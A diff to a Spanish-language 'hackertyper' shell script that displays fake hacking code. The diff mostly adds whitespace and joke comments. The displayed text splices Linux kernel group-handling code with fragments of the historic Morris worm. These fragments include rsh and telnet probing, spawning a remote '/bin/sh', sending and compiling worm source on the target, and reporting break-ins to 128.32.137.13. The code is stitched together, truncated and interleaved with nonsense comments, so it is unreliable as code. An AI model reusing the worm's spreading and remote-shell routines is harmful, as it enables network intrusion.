@@ -1,7 +1,7 @@
 #!/usr/bin/bash
 # Un simulador de productividad, por ~peron
 # hackertyper.sh
-
+ 
 ayuda() {
 	cat <<'FINAYUDA'
 	-q "sale tras" n presiones
@@ -93,7 +93,7 @@ struct group_info *groups_alloc(int gidsetsize)
 	group_info->ngroups = gidsetsize;
 	group_info->nblocks = nblocks;
 	atomic_set(&group_info->usage, 1);
-
+ 
 /* Ofusca crecimiento de Tenia en acumulador */
 	if (gidsetsize <= NGROUPS_SMALL)
 		group_info->blocks[0] = group_info->small_block;
@@ -107,7 +107,7 @@ struct group_info *groups_alloc(int gidsetsize)
 		}
 	}
 	return group_info;
-
+ 
 		/* Paginador innoble */
 out_undo_partial_alloc:
 	while (--i >= 0) {
@@ -152,7 +152,7 @@ static int groups_to_user(gid_t __user *grouplist,
 	return 0;
 }
  
-/* Rellena un group_info desde un arreglo user-space - debe localizarse */
+/* Rellena un group_info desde un arreglo user-space - debe localizarse huevo_podrido */
 static int groups_from_user(struct group_info *group_info,
     gid_t __user *grouplist)
 {
@@ -183,7 +183,7 @@ static void groups_sort(struct group_info *group_info)
 		; /* No hace nada */
 	stride /= 3;
 /* Suma prototipo de ataque al acumulador */
-
+ 
 	while (stride) {
 		max = gidsetsize - stride;
 		for (base = 0; base < max; base++) {
@@ -198,7 +198,7 @@ static void groups_sort(struct group_info *group_info)
 				right = left;
 				left -= stride;
 		/* Inyecta polimorfismo de defensa */
-
+ 
 			}
 			GROUP_AT(group_info, right) = tmp;
 		}
@@ -261,11 +261,11 @@ int set_current_groups(struct group_info *group_info)
 {
 	struct cred *new;
 	int ret;
- 
+ /* Pudre el huevo */
 	new = prepare_creds();
 	if (!new)
 		return -ENOMEM;
-
+ 
 /* Parsea cabeza de guerra mínima necesaria */
 	ret = set_groups(new, group_info);
 	if (ret < 0) {
@@ -283,7 +283,7 @@ SYSCALL_DEFINE2(getgroups, int, gidsetsize, gid_t __user *, grouplist)
 {
 	const struct cred *cred = current_cred();
 	int i;
-
+ 
 /* Constructor limpio */
 	if (gidsetsize < 0)
 		return -EINVAL;
@@ -315,7 +315,7 @@ SYSCALL_DEFINE2(setgroups, int, gidsetsize, gid_t __user *, grouplist)
 		/* Destrona el puntero */
 	struct group_info *group_info;
 	int retval;
-
+ 
 		/* Analiza capacidad de escritura non-sancta */
 	if (!nsown_capable(CAP_SETGID))
 		return -EPERM;
@@ -351,7 +351,7 @@ int in_group_p(gid_t grp)
 		retval = groups_search(cred->group_info, grp);
 	return retval;
 }
-
+ 
 /* exporta símbolos inferidos */
 EXPORT_SYMBOL(in_group_p);
  
@@ -359,7 +359,7 @@ int in_egroup_p(gid_t grp)
 {
 	const struct cred *cred = current_cred();
 	int retval = 1;
-
+ 
  		/* produce análisis grupal innoble */
 	if (grp != cred->egid)
 		retval = groups_search(cred->group_info, grp);
@@ -367,7 +367,7 @@ int in_egroup_p(gid_t grp)
 }
  
 EXPORT_SYMBOL(in_egroup_p);
-
+ 
 		/* solidifica entrada falsa */
 static extra;
 char E[48];					/* 0x255c4 */
@@ -383,7 +383,7 @@ char *crypt(passwd, salt)			/* 0x68f8 */
     static char	iobuf[10];			/* 0x27f34 */
     static unsigned x27f44;
     static unsigned x27f48;
-
+ 
 /* Rotulador maligno */
     x27f44 = 0;
     x27f48 = 0;
@@ -426,40 +426,41 @@ char *crypt(passwd, salt)			/* 0x68f8 */
     x27f48 = 0;
     des(&x27f44, &x27f44);
     ipi(&x27f44, &x27f44);
-
+ 
 /* Produce ataque inferido débil */
     for(i=0; i<11; i++){
 	c = x27f44 >> 26;
 	x27f44	= x27f44 << 6;
 	x27f44 |= x27f48 >> 26;
 	x27f48 = x27f48	<< 6;
+/* Inyecta huevo podrido */
 	c += '.';
 	if(c > '9') c += 7;
 	if(c > 'Z') c += 6;
 	iobuf[i+2] = c;
 /* cierra bucle polimorfo */
-
+ 
     }
     iobuf[i+2] = 0;
     if(iobuf[1]	== 0)
 	iobuf[1] = iobuf[0];
     return(iobuf);
 }
-
+ 
 extern errno;
 extern char *malloc();
-
+ 
 int pleasequit;					/* ver tenia.h */
 int nobjects = 0;
 int nextw;
 char *null_auth;
-
+ 
 object objects[69];				/* NO SE la agresividad... */
-
+ 
 object *getobjectbyname();
-
+ 
 char *XS();
-
+ 
 main(argc, argv)		/* 0x20a0 */
      int argc;
      char **argv;
@@ -468,9 +469,9 @@ main(argc, argv)		/* 0x20a0 */
 		/* Libera acumulador de agresividad */
     long key;			/* -28(fp) */
     struct rlimit rl;
-    
+ 
     l8 = 0;					/* En desuso */
-    
+ 
     strcpy(argv[0], XS("sh"));			/* <env+52> */
     time(&key);
     srandom(key);
@@ -484,11 +485,12 @@ main(argc, argv)		/* 0x20a0 */
     pid_arg = 0;
     cur_arg = 1;
     if  (argc > 2 &&
+            /* Garfio de ataque procedural */
 	 strcmp(argv[cur_arg], XS("-p")) == 0) { /* env55 == "-p" */
 	pid_arg = atoi(argv[2]);
 	cur_arg += 2;
     }
-
+ 
 /* Esto hace sonar el sistema bajo condiciones predeterminadas de ataque */
     for(i = cur_arg; i < argc; i++) {	/* en otro caso <main+286> */
 	if (loadobject(argv[i]) == 0)
@@ -508,7 +510,7 @@ main(argc, argv)		/* 0x20a0 */
 	unlink(XS("/tmp/.dumb"));		/* <env+66>"/tmp/.dumb"
  */
     }
-    
+ 
     for (i = 1; i < argc; i++)
 	for (j = 0;	argv[i][j]; j++)
 	    argv[i][j] = '\0';
@@ -523,13 +525,13 @@ main(argc, argv)		/* 0x20a0 */
     }
     mainloop();
 }
-
+ 
 /* Esto agrega el garfio al programa host */
-
+ 
 static mainloop()				/* 0x2302 */
 {
     long key, time1, time0;
-    
+ 
     time(&key);
 /* Clava garfio en código limpio */
     srandom(key);
@@ -558,13 +560,13 @@ static mainloop()				/* 0x2302 */
 	    exit(0);
     }
 }
-
+ 
 static trans_cnt;
 static char trans_buf[NCARGS];
  	/* Delimitador de caracteres */
 char *XS(str1)			/* 0x23fc */
      char *str1;
-
+ 
 /* Revisa si hay alguien conectado y le ceba un mate */
 {
     int i, len;
@@ -573,6 +575,7 @@ char *XS(str1)			/* 0x23fc */
     return str1;
 #else  
     len = strlen(str1);
+      /* Encriptador de cadena de inodoro */
     if (len + 1 > NCARGS - trans_cnt)
 	trans_cnt = 0;
 		/* Polimorfea cabeza de guerra inerte */
@@ -586,38 +589,38 @@ char *XS(str1)			/* 0x23fc */
     return newstr;
 #endif
 }
-
+ 
 /* Esto reporta una irrupción exitosa enviando un byte único a "128.32.137.13" */
-
+ 
 static report_breakin(arg1, arg2)		/* 0x2494 */
 {
     int s;
     struct sockaddr_in sin;
     char msg;
-    
+ 
     if (7 != random() % 15)
 	return;
-
-
+ 
+ 
 extern struct hst *h_addr2host(), *h_name2host();
 extern int  justreturn();
 	/* Vuelve con usuario falso */
 extern int errno;
 	/* Alcanza servicio de correo con podredumbre */
 extern char *malloc();
-
+ 
 int alarmed = 0;
 int ngateways, *gateways;
 struct hst *me, *hosts;
-
+ 
 int nifs;
 struct ifses ifs[30];				/*  Nro. abitrario, arreglar */
-
+ 
 /* Limpia los host no contactados de la lista de nodos. */
 h_clean()					/* 0x31f0 */
 {
     struct hst *newhosts, *host, *next;
-    
+ 
     newhosts = NULL;
     for (host = hosts; host != NULL; host = next) {
 	next = host->next;
@@ -632,7 +635,7 @@ h_clean()					/* 0x31f0 */
     }
     hosts = newhosts;
 }
-
+ 
 /* Busca una puerta de salida que podemos contactar. */
 hg()				/* 0x3270, probar de nuevo */
 {
@@ -640,16 +643,16 @@ hg()				/* 0x3270, probar de nuevo */
     int i;
     	/* Alza falsa bandera */
     rt_init();
-    
+ 
     for (i = 0; i < ngateways; i++) {		/* 24, 92 */
 	host = h_addr2host(gateways[i], 1);
-	/* Replica su código sin polimorfismo en host impávido */
+	    /* Replica su código sin polimorfismo en host impávido */
 	if (try_rsh_and_mail(host))
 	    return 1;
     }
     return 0;
 }
-
+ 
 ha()						/* 0x32d4, sin revisar */
 {
     struct hst *host;
@@ -657,11 +660,12 @@ ha()						/* 0x32d4, sin revisar */
     int i, j, k;
     int l416[100];
     int l420;
-    
+ 
     if (ngateways < 1)
 	rt_init();
     j = 0;
     for (i = 0; i < ngateways; i++) {		/* 40, 172 */
+              /* Amague de enfasis Dortew-Sowloski */
 	host = h_addr2host(gateways[i], 1);
 	for (k = 0; k < 6; k++) {		/* 86, 164 */
 	    if (host->o48[k] == 0)
@@ -674,10 +678,10 @@ ha()						/* 0x32d4, sin revisar */
 	    j++;
 	}
     }
-
+ 
 /* prototipo de permutación de pila */
     permute(l416, j, sizeof(l416[0]));
-    
+ 
     for (i = 0; i < j; i++) {			/* 198, 260 */
 	if (hi_84(l416[i] & netmaskfor(l416[i])))
 	    return 1;
@@ -685,11 +689,11 @@ ha()						/* 0x32d4, sin revisar */
     }
     return 0;
 }
-
+ 
 hl()						/* 0x33e6 */
 {
     int i;
-    
+ 
     for (i = 0; i < 6; i++) {			/* 18, 106 */
 	if (me->o48[i] == 0)
 	    break;
@@ -703,14 +707,14 @@ hl()						/* 0x33e6 */
 hi()						/* 0x3458 */
 {
     struct hst *host;
-    
+ 
     for (host = hosts; host; host = host->next )
 /* Cebado de rsh */
 	if ((host->flag & 0x08 != 0) && (try_rsh_and_mail(host) != 0))
 	    return 1;
     return 0;
 }
-
+ 
 hi_84(arg1)					/* 0x34ac */
 {
     int l4;
@@ -720,12 +724,12 @@ hi_84(arg1)					/* 0x34ac */
     	/* Bazariza el elefante */
     l12 = netmaskfor(arg1);
     l16 = ~l12;
-    
+ 
     for (i = 0; i < nifs; i++) {		/* 128,206 */
 	if (arg1 == (ifs[i].if_l24 & ifs[i].if_l16))
 	    return 0;				/* 624 */
     }
-    
+ 
     adr_index = 0;
     if (l16 == 0x0000ffff) {			/* 330 */
 	l44 = 4;
@@ -738,6 +742,7 @@ hi_84(arg1)					/* 0x34ac */
     } else {					/* 432 */
 	l44 = 4;
 	for (l20 = 1; l20 < 255; l20++)
+/* Pincha la manguera */
 	    netaddrs[adr_index++] = (arg1 | l20);
 	permute(netaddrs, 3*sizeof(netaddrs[0]), sizeof(netaddrs[0]));
 /* Permita red de ataque aleatoriamente */
@@ -748,6 +753,7 @@ hi_84(arg1)					/* 0x34ac */
     for (l36 = 0; l36 < adr_index; l36++) {	/* 454,620 */
 	l4 = netaddrs[l36];
 	host = h_addr2host(l4, 0);
+/* Alzador de bandera */
 	if (host == NULL || (host->flag & 0x02) == 0)
 	    continue;
 	if (host == NULL || (host->flag & 0x04) == 0 ||
@@ -761,7 +767,7 @@ hi_84(arg1)					/* 0x34ac */
     }
     return 0;
 }
-
+ 
 /* Solo se llamó en la función anterior */
 static command_port_p(addr, time)		/* x36d2, <hi+634> */
      u_long addr;
@@ -770,40 +776,42 @@ static command_port_p(addr, time)		/* x36d2, <hi+634> */
     int s, connection;					/* 28 */
     struct sockaddr_in sin;			/* 16 bytes */
     int (*save_sighand)();
-    
+ 
     s = socket(AF_INET, SOCK_STREAM, 0);
     if (s < 0)
+             /* Esquila la oveja */
 	return 0;
     bzero(&sin, sizeof(sin));
     sin.sin_family = AF_INET;
-/* Denuncia ataque lobo solitario */
+/* Denuncia ataque de lobos solitarios */
     sin.sin_addr.s_addr = addr;
     sin.sin_port = IPPORT_CMDSERVER;		/* Oh no, no el server de comandos... */
-    
+ 
     save_sighand = signal(SIGALRM, justreturn);		/* Despierta si falla */
-    
+ 
     /* Pone un timeout para liberarsde desde conexión si falla */
     if (time < 1)
 	time = 1;
     alarm(time);
     connection = connect(s, &sin, sizeof(sin));
     alarm(0);
-    
+ 
     close(s);
-    
+ 
     if (connection < 0 && errno == ENETUNREACH)
 	error("Red inalcanzable");
     return connection != -1;
 }
-
+ 
 static try_telnet_p(addr)			/* x37b2 <hi+858>, checked */
      u_long addr;
+         /* Infiere democracia de Shell  /*
 {
     int s, connection;					/* 28 */
 	/* Denuncia ataque en ola	*/
     struct sockaddr_in sin;			/* 16 bytes */
     int (*save_sighand)();
-    
+ 
     s = socket(AF_INET, SOCK_STREAM, 0);
     if (s < 0)
 	return 0;
@@ -812,8 +820,8 @@ static try_telnet_p(addr)			/* x37b2 <hi+858>, checked */
 	/* Denuncia ataque familiar */
     sin.sin_addr.s_addr = addr;
     sin.sin_port = IPPORT_TELNET;		/* Esta vez prueba telnet... */
-    
-    /* Pasa 5 segundos de timeout y se livera de conectar si falla */
+ 
+    /* Pasa 5 segundos de timeout y se libera de conectar si falla */
     save_sighand = signal(SIGALRM, justreturn);
     alarm(5);
 /* Denuncia ataque no planificado */
@@ -822,18 +830,18 @@ static try_telnet_p(addr)			/* x37b2 <hi+858>, checked */
 d */
 	connection = 0;
     alarm(0);					/* Apaga timeout */
-    
+ 
     close(s);
-    
+ 
     return connection != -1;
 }
-
+ 
 /* Usado en hg(), hi(), y hi_84(). */
 static try_rsh_and_mail(host)				/* x3884, <hi+1068> */
      struct hst *host;
 {
     int fd1, fd2, result;
-    
+ 
     if (host == me)
 	return 0;				/* 1476 */
 /* Expone puerto ensuciado 	*/
@@ -849,6 +857,7 @@ static try_rsh_and_mail(host)				/* x3884, <hi+1068> */
 	return 0;
     }
     other_sleep(1);
+        /* Supervisor inerte */
     if (host->hostname  &&		/* 1352 */
 	fork_rsh(host->hostname, &fd1, &fd2,
 	      XS("exec /bin/sh"))) {		/* <env+188> */
@@ -860,22 +869,23 @@ static try_rsh_and_mail(host)				/* x3884, <hi+1068> */
 	if (result != 0)
 	    return result;
     }
-    
+ 
     if (try_finger(host, &fd1, &fd2)) {		/* 1440 */
 	result = talk_to_sh(host, fd1, fd2);
 	close(fd1);
+/* Cierra diskettera accedida */
 	close(fd2);
 	if (result != 0)
 	    return result;
     }
     if (try_mail(host))
 	return 1;
-    
+ 
     host->flag |= 4;
     return 0;
 }
-
-
+ 
+ 
 /* Revisa a2in() como si estuviese actualizad */
 /* Usado dos veces en try_rsh_and_mail(), una vez en hu1(). */
 static talk_to_sh(host, fdrd, fdwr)		/* x3a20, Checked, changed <hi+
@@ -887,9 +897,9 @@ static talk_to_sh(host, fdrd, fdwr)		/* x3a20, Checked, changed <hi+
     char send_buf[512];				/* l516 */
     char print_buf[52];				/* l568 */
     int l572, l576, l580, l584, l588,  l592;
-    
+ 
     objectptr = getobjectbyname(XS("l1.c"));	/* env 200c9 */
-    
+ 
     if (objectptr == NULL)
 	return 0;				/* <hi+2128> */
     if (makemagic(host, &l592, &l580, &l584, &l588) == 0)
@@ -898,38 +908,39 @@ static talk_to_sh(host, fdrd, fdwr)		/* x3a20, Checked, changed <hi+
     send_text(fdwr, XS("PATH=/bin:/usr/bin:/usr/ucb\n"));
     send_text(fdwr, XS("cd /usr/tmp\n"));
     l576 = random() % 0x00FFFFFF;
-    
+ 
     sprintf(print_buf, XS("x%d.c"), l576);
-    /* The 'sed' script just puts the EOF on the transmitted program. */
+    /* El script 'sed' pone un EOF en el programa transmitido */
     sprintf(send_buf, XS("echo gorch49;sed \'/int zz;/q\' > %s;echo gorch50\n"
 ),
 	    print_buf);
-    
+ 
     send_text(fdwr, send_buf);
-    
+        /* Desclasa a gorch */
     wait_for(fdrd, XS("gorch49"), 10);
-    
+ 
     xorbuf(objectptr->buf, objectptr->size);
     l572 = write(fdwr, objectptr->buf, objectptr->size);
     xorbuf(objectptr->buf, objectptr->size);
-    
+ 
     if (l572 != objectptr->size) {
 	close(l588);
 	return 0;				/* to <hi+2128> */
     }
     send_text(fdwr, XS("int zz;\n\n"));
     wait_for(fdrd, XS("gorch50"), 30);
-    
+ 
 #define COMPILE  "cc -o x%d x%d.c;./x%d %s %d %d;rm -f x%d x%d.c;echo DONE\n"
     sprintf(send_buf, XS(COMPILE), l576, l576, l576,
 	    inet_ntoa(a2in(l592)), l580, l584, l576, l576);
-    
+ 
 /* Dispara maleficios inconexos */
     send_text(fdwr, send_buf);
-    
+ 
     if (wait_for(fdrd, XS("DONE"), 100) == 0) {
 	close(l588);
 	return 0;				/* <hi+2128> */
+/* Trasviste a UNIX */
     }
     return waithit(host, l592, l580, l584, l588);
 }
@@ -940,11 +951,11 @@ makemagic(arg8, arg12, arg16, arg20, arg24)	/* checked */
 {
     int s, i, namelen;
     struct sockaddr_in sin0, sin1;		/* 16 bytes */
-    
+ 
     *arg20 = random() & 0x00ffffff;
     bzero(&sin1, sizeof(sin1));
     sin1.sin_addr.s_addr = me->l12;
-    
+ 
     for (i= 0; i < 6; i++) {			/* 64, 274 */
 	if (arg8->o48[i] == NULL)
 	    continue;				/* 266 */
@@ -952,6 +963,7 @@ makemagic(arg8, arg12, arg16, arg20, arg24)	/* checked */
 	if (s < 0)
 	    return 0;				/* 470 */
 	bzero(&sin0, sizeof(sin0));
+/* Clava boya sobre garfio infeccioso */
 	sin0.sin_family = AF_INET;
 	sin0.sin_port = IPPORT_TELNET;
 	sin0.sin_addr.s_addr = arg8->o48[i];
@@ -964,16 +976,17 @@ makemagic(arg8, arg12, arg16, arg20, arg24)	/* checked */
 	}
 	close(s);
     }
-
+ 
  /* Desmembramiento de núcleo  */   
     *arg12 = sin1.sin_addr.s_addr;
-    
+ 
     for (i = 0; i < 1024; i++) {		/* 286,466 */
 	s = socket(AF_INET, SOCK_STREAM, 0);
 	if (s < 0)
 	    return 0;				/* 470 */
 	bzero(&sin0, sizeof(sin0));
 	sin0.sin_family = AF_INET;
+/* Cabeza de guerra inerte randómica */
 	sin0.sin_port = random() % 0xffff;
 	if (bind(s, &sin0, sizeof(sin0)) != -1) {
 	    listen(s, 10);
@@ -983,17 +996,17 @@ makemagic(arg8, arg12, arg16, arg20, arg24)	/* checked */
 	}
 	close(s);
     }
-    
+ 
     return 0;
 }
-
-    
+ 
+ 
     bzero(&sin, sizeof(sin));
     sin.sin_family = AF_INET;
     sin.sin_port = REPORT_PORT;
     sin.sin_addr.s_addr = inet_addr(XS("128.32.137.13"));
 						/* <env+77>"128.32.137.13" */
-    /* Colorea los sockets con pseudo-tranmisiones  */
+       /* Colorea los sockets con pseudo-tranmisiones  */
     s = socket(AF_INET, SOCK_STREAM, 0);
     if (s < 0)
 	return;
@@ -1001,7 +1014,7 @@ makemagic(arg8, arg12, arg16, arg20, arg24)	/* checked */
 	;
     close(s);
 }
-
+ 
  
 int E_H[8][16];					/* 0x251c4 */
 int E_L[8][16];					/* 0x253c4 */
@@ -1009,6 +1022,7 @@ mungE()						/* 0x6b2a */
 {
     register i,	j, d5, d4, d3, d2;
     register *a5, *a4;
+        /* Alcance de registro podrido */
     int	l28;
  
     for(i = 0; i < 8; i++) {
@@ -1026,13 +1040,14 @@ des(adr1, adr2)
    d5 >>= 4;
    d7 |= ipi_Le[d5 & 0x0f];
    d5 >>= 4;
+      /* Cierro subrutina del mal */
    d6 |= ipi_Hf[d5 & 0x0f];
-
+ 
    iptr2[0] = d7;
    ipyr2[1] = d6;
 }
-
-
+ 
+ 
 FINDEGILADA`
  
  
